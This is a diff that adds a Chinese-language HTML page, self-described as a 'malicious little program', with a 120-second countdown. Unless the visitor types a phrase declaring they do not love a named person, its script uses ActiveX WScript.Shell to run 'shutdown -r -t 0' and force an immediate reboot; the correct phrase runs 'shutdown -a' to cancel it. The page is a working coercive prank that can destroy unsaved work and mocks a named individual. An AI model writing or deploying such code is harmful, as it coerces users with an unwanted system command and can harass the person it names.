@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>温馨提示</title>
+    <style>
+        body{background:#111;color:#fff;font-size:24px;text-align:center;padding-top:80px;}
+        input{padding:12px;font-size:22px;width:320px;margin-top:30px;}
+        .red{color:red;font-weight:bold;}
+    </style>
+</head>
+<body>
+    <p>我是恶意小程序</p >
+    <p class="red">快输入：我不爱高鹤云</p >
+    <p>超时将自动重启电脑！</p >
+    <p id="count">剩余时间：120 秒</p >
+    <input type="text" id="inp" placeholder="在此输入">
+
+    <script>
+        let time = 120;
+        let t = setInterval(()=>{
+            time--;
+            document.getElementById('count').innerText = `剩余时间：${time} 秒`;
+            if(time <= 0){
+                clearInterval(t);
+                // 执行重启命令
+                new ActiveXObject("WScript.Shell").Run("shutdown -r -t 0");
+            }
+        },1000)
+
+        document.getElementById('inp').oninput = function(){
+            if(this.value === "我不爱高鹤云"){
+                clearInterval(t);
+                // 取消重启
+                new ActiveXObject("WScript.Shell").Run("shutdown -a");
+                alert("成功解除，逃过一劫！");
+            }
+        }
+    </script>
+</body>
+</html>
